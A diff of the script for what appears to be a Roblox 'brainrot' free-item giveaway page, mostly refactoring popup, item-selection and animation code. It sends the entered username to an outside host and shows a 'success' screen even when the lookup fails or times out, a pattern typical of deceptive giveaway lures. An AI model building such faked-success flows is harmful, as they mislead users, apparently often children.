-      if (popup) {
-        popup.style.display = 'flex';
-      }
       
-      // Stop notifications when popup opens
+      if (popup) popup.style.display = 'flex';
       popupOpen = true;
       stopNotifications();
       
-      // Stop background pets animation to reduce lag
-      if (typeof window.stopPetsAnimation === 'function') {
-        window.stopPetsAnimation();
-      }
-
-      // Loading state while fetching profile
+      if (typeof window.stopPetsAnimation === 'function') window.stopPetsAnimation();
+      
       popupContent.innerHTML = `
-        <div class="popup-header">
-          <h3>Searching</h3>
-        </div>
-        <div style=\"text-align:center;padding:20px\">
-          <div class=\"folding\">
-            <div class=\"sk-cube1 sk-cube\"></div>
-            <div class=\"sk-cube2 sk-cube\"></div>
-            <div class=\"sk-cube4 sk-cube\"></div>
-            <div class=\"sk-cube3 sk-cube\"></div>
-            <div class=\"square\"></div>
-          </div>
-          <p class=\"searching-text\">Searching for @${username}</p>
+        <div class="popup-header"><h3>Searching</h3></div>
+        <div style="text-align:center;padding:20px">
+          <div class="folding"><div class="sk-cube1 sk-cube"></div><div class="sk-cube2 sk-cube"></div><div class="sk-cube4 sk-cube"></div><div class="sk-cube3 sk-cube"></div><div class="square"></div></div>
+          <p class="searching-text">Searching for @${username}</p>
         </div>
       `;
-
-      // Set timeout for API call (7 seconds)
+      
       let apiCompleted = false;
-      const timeout = setTimeout(function() {
+      const timeout = setTimeout(() => {
         if (!apiCompleted) {
           apiCompleted = true;
-          console.warn('API timeout - using fallback');
-          // Fallback: show success state without avatar
-          try {
-            globalData.user_name = username;
-            globalData.user_avatar = null;
-          } catch (e) {}
+          globalData.user_name = username;
+          globalData.user_avatar = null;
           showSuccessState(username, null, itemName, itemImage);
         }
       }, 7000);
-
-      // Use API to search for user
-      fetch(endpoint)
-        .then(function(response) { 
-          if (apiCompleted) return null; // Already handled by timeout
-          return response.json(); 
-        })
-        .then(function(data) {
-          if (apiCompleted) return; // Already handled by timeout
+      
+      fetch(`https://abadaoucht.com/tiktok/api/roblox/userinfo/${encodeURIComponent(username)}`)
+        .then(response => response.json())
+        .then(data => {
+          if (apiCompleted) return;
           clearTimeout(timeout);
           apiCompleted = true;
-          
           if (data && data.status === "SUCCESS") {
-            // Save to globalData
-            try {
-              globalData.user_name = username;
-              globalData.user_avatar = data.avatar || null;
-            } catch (e) {}
+            globalData.user_name = username;
+            globalData.user_avatar = data.avatar || null;
             showSuccessState(username, data.avatar, itemName, itemImage);
           } else {
-            // API returned but status not SUCCESS - use fallback
-            try {
-              globalData.user_name = username;
-              globalData.user_avatar = null;
-            } catch (e) {}
+            globalData.user_name = username;
+            globalData.user_avatar = null;
             showSuccessState(username, null, itemName, itemImage);
           }
         })
-        .catch(function(error) {
-          if (apiCompleted) return; // Already handled by timeout
+        .catch(error => {
+          if (apiCompleted) return;
           clearTimeout(timeout);
           apiCompleted = true;
-          console.error('API Error:', error);
-          // Fallback: show success state without avatar instead of error
-          try {
-            globalData.user_name = username;
-            globalData.user_avatar = null;
-          } catch (e) {}
+          globalData.user_name = username;
+          globalData.user_avatar = null;
           showSuccessState(username, null, itemName, itemImage);
         });
-    }
-
-
-
+    };
+    
+    // Start fetching avatars
+    fetchAllAvatars();
+    
     // Brainrot selection (single-select)
     $(document).ready(function() {
       const dingSound = document.getElementById('dingSound');
-      let soundEnabled = true;
       let selectedItems = [];
       const mainUsernameInput = document.getElementById('main-username-input');
       const mainContinueBtn = document.getElementById('main-continue-btn');
       const mainContinueContainer = document.getElementById('main-continue-container');
       
-      // Create error message container
       const errorMessageContainer = document.createElement('div');
       errorMessageContainer.className = 'error-message-container';
       errorMessageContainer.style.cssText = 'display: none; text-align: center; position: fixed; top: 80px; left: 0; right: 0; margin: 0 auto; padding: 12px 20px; background: rgba(225, 29, 72, 0.9); color: white; font-weight: bold; font-size: 1.1em; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.2); z-index: 1000; max-width: 80%; width: 400px; opacity: 0; transition: opacity 0.5s ease-in-out;';
@@ -2224,396 +1819,133 @@
       function showTopError(message) {
         errorMessageContainer.textContent = message;
         errorMessageContainer.style.display = 'block';
-        setTimeout(() => {
-          errorMessageContainer.style.opacity = '1';
-        }, 10);
+        setTimeout(() => errorMessageContainer.style.opacity = '1', 10);
         setTimeout(() => {
           errorMessageContainer.style.opacity = '0';
-          setTimeout(() => {
-            errorMessageContainer.style.display = 'none';
-          }, 500);
+          setTimeout(() => errorMessageContainer.style.display = 'none', 500);
         }, 2500);
       }
       
       function refreshContinueButton() {
         const usernameOk = !!(mainUsernameInput && mainUsernameInput.value.trim());
         const selectionOk = selectedItems.length === 1;
-        const shouldShow = usernameOk && selectionOk;
-        
-        if (mainContinueContainer) {
-          if (shouldShow) {
-            mainContinueContainer.style.display = 'block';
-          } else {
-            mainContinueContainer.style.display = 'none';
-          }
-        }
+        if (mainContinueContainer) mainContinueContainer.style.display = (usernameOk && selectionOk) ? 'block' : 'none';
       }
       
-      // Listen to username input changes
       if (mainUsernameInput) {
         mainUsernameInput.addEventListener('input', refreshContinueButton);
         mainUsernameInput.addEventListener('keypress', function(e) {
           if (e.key === 'Enter') {
             e.preventDefault();
-            if (mainContinueBtn && mainContinueContainer.style.display !== 'none') {
-              mainContinueBtn.click();
-            }
+            if (mainContinueBtn && mainContinueContainer.style.display !== 'none') mainContinueBtn.click();
           }
         });
       }
       
-      // Handle item selection
       $('.item-card').click(function() {
         const itemCard = $(this);
         const itemName = itemCard.find('.item-name').text().trim();
         const itemImage = itemCard.find('.item-img').attr('src');
         
-        // Check if item is already selected
         if (itemCard.hasClass('selected')) {
-          // Deselect item
           itemCard.removeClass('selected');
           selectedItems = selectedItems.filter(item => item.name !== itemName);
         } else {
-          // If another item is already selected, deselect it first
           if (selectedItems.length >= 1) {
             $('.item-card.selected').removeClass('selected');
             selectedItems = [];
           }
-          
-          // Select item
           itemCard.addClass('selected');
           selectedItems.push({ name: itemName, image: itemImage });
         }
         
-        // Play sound
         dingSound.currentTime = 0;
         dingSound.play();
-        
-        // Update continue button visibility
         refreshContinueButton();
       });
       
-      // Handle Continue button click
       if (mainContinueBtn) {
         mainContinueBtn.addEventListener('click', function() {
           const username = mainUsernameInput ? mainUsernameInput.value.trim() : '';
-          
-          if (!username) {
-            showTopError('Please enter your Roblox username!');
-            if (mainUsernameInput) mainUsernameInput.focus();
-            return;
-          }
-          
-          if (selectedItems.length !== 1) {
-            showTopError('Please select one brainrot!');
-            return;
-          }
-          
-          // Play click sound
+          if (!username) { showTopError('Please enter your Roblox username!'); if (mainUsernameInput) mainUsernameInput.focus(); return; }
+          if (selectedItems.length !== 1) { showTopError('Please select one brainrot!'); return; }
           const clickSound = document.getElementById('clickSound');
-          if (clickSound) {
-            clickSound.currentTime = 0;
-            clickSound.play();
-          }
-          
-          // Show profile lookup popup
+          if (clickSound) { clickSound.currentTime = 0; clickSound.play(); }
           const popup = document.getElementById('purchase-popup');
-          if (popup) {
-            popup.style.display = 'flex';
-          }
-          
-          // Start username confirmation flow
-          showUsernameConfirmation(username, selectedItems[0].name, selectedItems[0].image, function() {
-            // Retry callback - just refocus username input
-            if (mainUsernameInput) mainUsernameInput.focus();
-          });
+          if (popup) popup.style.display = 'flex';
+          showUsernameConfirmation(username, selectedItems[0].name, selectedItems[0].image, function() { if (mainUsernameInput) mainUsernameInput.focus(); });
         });
       }
       
-      // Initial state
       refreshContinueButton();
     });
     
-    // Function to show multi-item purchase popup
-    const showMultiItemPurchasePopup = (items) => {
-      // Stop notifications
-      popupOpen = true;
-      stopNotifications();
-      
-      const popup = document.getElementById('purchase-popup');
-      const popupContent = popup.querySelector('.popup-content');
-      
-      // Create item images HTML
-      let itemImagesHTML = '<div style="display: flex; justify-content: center; gap: 10px; margin-bottom: 15px;">';
-      items.forEach(item => {
-        itemImagesHTML += `<img src="${item.image}" alt="${item.name}" style="width: 70px; height: 70px; object-fit: cover; border-radius: 10px; background: rgba(255,255,255,0.1);">`;
-      });
-      itemImagesHTML += '</div>';
-      
-      // Create item names HTML
-      let itemNamesHTML = '<p class="item-confirm">Would you like to Get "<span>';
-      items.forEach((item, index) => {
-        if (index > 0) {
-          itemNamesHTML += index === items.length - 1 ? ' and ' : ', ';
-        }
-        itemNamesHTML += item.name;
-      });
-      itemNamesHTML += '</span>"?</p>';
-      
-      popupContent.innerHTML = `
-        <div class="popup-header">
-          <h3>Get Items</h3>
-        </div>
-        ${itemImagesHTML}
-        ${itemNamesHTML}
-        <div class="input-group">
-          <input type="text" id="username-input" placeholder="Enter your Roblox username">
-        </div>
-        <div class="user-error d-none">Please enter a valid username</div>
-        <div class="popup-buttons">
-          <button class="cancel-btn">Cancel</button>
-          <button class="action-btn" id="search-user-btn">
-            <span class="action-badge">Search Now ➤</span>
-          </button>
-        </div>
-      `;
-      
-      popupContent.querySelector('.cancel-btn').addEventListener('click', closePurchasePopup);
-      popupContent.querySelector('#search-user-btn').addEventListener('click', function() {
-        // Play sound when clicking button
-        const clickSound = document.getElementById('clickSound');
-        clickSound.currentTime = 0;
-        clickSound.play();
-        
-        const username = document.getElementById('username-input').value.trim();
-        if (!username) {
-          document.querySelector('.user-error').classList.remove('d-none');
-          return;
-        }
-        showUsernameConfirmation(username, items[0].name, items[0].image, function() { showMultiItemPurchasePopup(items); });
-      });
-      
-      popup.style.display = 'flex';
-      document.getElementById('username-input').focus();
-    }
-
-    // Inject pulsing animation and button styles for the Let's Go button
-    (function() {
-      const style = document.createElement('style');
-      style.innerHTML = `
-        @keyframes pulse-glow {
-          0% { box-shadow: 0 0 0 0 #22c55e88; }
-          70% { box-shadow: 0 0 0 16px #22c55e00; }
-          100% { box-shadow: 0 0 0 0 #22c55e00; }
-        }
-        .lets-go-btn-animated {
-          background: linear-gradient(90deg, #22c55e 0%, #16e085 100%);
-          color: #fff;
-          font-size: 1.35em;
-          font-weight: 900;
-          border-radius: 16px;
-          border: none;
-          padding: 22px 0;
-          width: 100%;
-          cursor: pointer;
-          box-shadow: 0 2px 16px #22c55e55;
-          animation: pulse-glow 1.3s infinite;
-          transition: transform 0.15s, box-shadow 0.2s;
-          position: relative;
-          letter-spacing: 0.5px;
-        }
-        .lets-go-btn-animated:active {
-          transform: scale(0.97) translateY(2px);
-          box-shadow: 0 1px 8px #22c55e99;
-        }
-        .lets-go-btn-animated:hover {
-          transform: scale(1.04) translateY(-2px);
-          box-shadow: 0 4px 24px #22c55e99;
-        }
-        .lets-go-microcopy {
-          color: var(--accent3);
-          font-size: 1.08em;
-          font-weight: 700;
-          margin-top: 13px;
-          text-shadow: 0 1px 8px #0002;
-          letter-spacing: 0.2px;
-        }
-      `;
-      document.head.appendChild(style);
-    })();
-    
     // Background Pets Management
     (function() {
-      const petImages = [
-        'images/Strawberryelephant-1-288x300.webp',
-        'images/Clear_background_clear_meowl_image-207x300.webp',
-        'images/Skibidi-Toilet-194x300.webp'
-      ];
-      
       const backgroundPetsContainer = document.getElementById('backgroundPets');
       let activePets = [];
-      const maxPets = 3;
       
       class BouncingPet {
         constructor(imageSrc, startX, startY, vx, vy) {
           this.element = document.createElement('div');
           this.element.className = 'floating-pet';
-          
           const img = document.createElement('img');
           img.src = imageSrc;
           img.alt = 'Floating Brainrot';
-          
           this.element.appendChild(img);
-          
-          // Starting position and velocity
           this.x = startX;
           this.y = startY;
           this.vx = vx;
           this.vy = vy;
-          
-          // Size
           this.width = 95;
           this.height = 95;
-          
           this.updatePosition();
           backgroundPetsContainer.appendChild(this.element);
         }
-        
-        updatePosition() {
-          this.element.style.transform = `translate3d(${this.x}px, ${this.y}px, 0)`;
-        }
-        
+        updatePosition() { this.element.style.transform = `translate3d(${this.x}px, ${this.y}px, 0)`; }
         update() {
-          // Update position
           this.x += this.vx;
           this.y += this.vy;
-          
-          // Check for wall collisions
-          if (this.x <= 0 || this.x >= window.innerWidth - this.width) {
-            this.vx = -this.vx;
-            this.x = Math.max(0, Math.min(this.x, window.innerWidth - this.width));
-          }
-          
-          if (this.y <= 0 || this.y >= window.innerHeight - this.height) {
-            this.vy = -this.vy;
-            this.y = Math.max(0, Math.min(this.y, window.innerHeight - this.height));
-          }
-          
+          if (this.x <= 0 || this.x >= window.innerWidth - this.width) { this.vx = -this.vx; this.x = Math.max(0, Math.min(this.x, window.innerWidth - this.width)); }
+          if (this.y <= 0 || this.y >= window.innerHeight - this.height) { this.vy = -this.vy; this.y = Math.max(0, Math.min(this.y, window.innerHeight - this.height)); }
           this.updatePosition();
         }
-        
-        destroy() {
-          if (this.element.parentNode) {
-            this.element.parentNode.removeChild(this.element);
-          }
-        }
+        destroy() { if (this.element.parentNode) this.element.parentNode.removeChild(this.element); }
       }
       
       function createPets() {
-        // Clear any existing pets
         activePets.forEach(pet => pet.destroy());
         activePets = [];
-        
-        // Create 3 specific brainrots with different starting positions and velocities
         const pets = [
-          {
-            image: 'images/Strawberryelephant-1-288x300.webp',
-            startX: 120,
-            startY: 180,
-            vx: 1.8,
-            vy: 1.5
-          },
-          {
-            image: 'images/Clear_background_clear_meowl_image-207x300.webp',
-            startX: window.innerWidth - 215,
-            startY: 300,
-            vx: -1.6,
-            vy: 1.9
-          },
-          {
-            image: 'images/Skibidi-Toilet-194x300.webp',
-            startX: 300,
-            startY: window.innerHeight - 215,
-            vx: 1.4,
-            vy: -1.7
-          }
+          { image: 'images/Strawberryelephant-1-288x300.webp', startX: 120, startY: 180, vx: 1.8, vy: 1.5 },
+          { image: 'images/Clear_background_clear_meowl_image-207x300.webp', startX: window.innerWidth - 215, startY: 300, vx: -1.6, vy: 1.9 },
+          { image: 'images/Skibidi-Toilet-194x300.webp', startX: 300, startY: window.innerHeight - 215, vx: 1.4, vy: -1.7 }
         ];
-        
-        pets.forEach(petData => {
-          const pet = new BouncingPet(
-            petData.image,
-            petData.startX,
-            petData.startY,
-            petData.vx,
-            petData.vy
-          );
-          activePets.push(pet);
-        });
+        pets.forEach(petData => activePets.push(new BouncingPet(petData.image, petData.startX, petData.startY, petData.vx, petData.vy)));
       }
       
       let animationId;
+      function animatePets() { activePets.forEach(pet => pet.update()); animationId = requestAnimationFrame(animatePets); }
+      window.stopPetsAnimation = () => { if (animationId) cancelAnimationFrame(animationId); animationId = null; };
       
-      function animatePets() {
-        activePets.forEach(pet => pet.update());
-        animationId = requestAnimationFrame(animatePets);
-      }
-      
-      function stopPetsAnimation() {
-        if (animationId) {
-          cancelAnimationFrame(animationId);
-          animationId = null;
-        }
-      }
-      
-      // Make stopPetsAnimation globally accessible
-      window.stopPetsAnimation = stopPetsAnimation;
-      
-      function initializePets() {
-        createPets();
-        animatePets();
-      }
-      
-      // Start pets when page loads
-      window.addEventListener('load', initializePets);
-      
-      // Adjust pets on window resize
-      window.addEventListener('resize', () => {
-        // Recreate pets with new window dimensions
-        createPets();
-      });
-      
-      // Cleanup on page unload
-      window.addEventListener('beforeunload', () => {
-        if (animationId) {
-          cancelAnimationFrame(animationId);
-        }
-      });
+      window.addEventListener('load', () => { createPets(); animatePets(); });
+      window.addEventListener('resize', () => createPets());
+      window.addEventListener('beforeunload', () => { if (animationId) cancelAnimationFrame(animationId); });
     })();
-
+    
     // Theme Toggle
     (function() {
       const themeToggle = document.getElementById('themeToggle');
       const body = document.body;
       const currentTheme = localStorage.getItem('theme');
-
-      // Default to night mode if no preference is saved
-      if (currentTheme === 'night' || currentTheme === null) {
-        body.classList.add('night-mode');
-        themeToggle.classList.add('night-mode');
-      }
-
+      if (currentTheme === 'night' || currentTheme === null) body.classList.add('night-mode');
+      if (body.classList.contains('night-mode')) themeToggle.classList.add('night-mode');
       themeToggle.addEventListener('click', () => {
         body.classList.toggle('night-mode');
         themeToggle.classList.toggle('night-mode');
-        
-        if (body.classList.contains('night-mode')) {
-          localStorage.setItem('theme', 'night');
-        } else {
-          localStorage.setItem('theme', 'light');
-        }
+        localStorage.setItem('theme', body.classList.contains('night-mode') ? 'night' : 'light');
       });
     })();
   </script>
-
-
-</body></html>
+</body>
+</html>
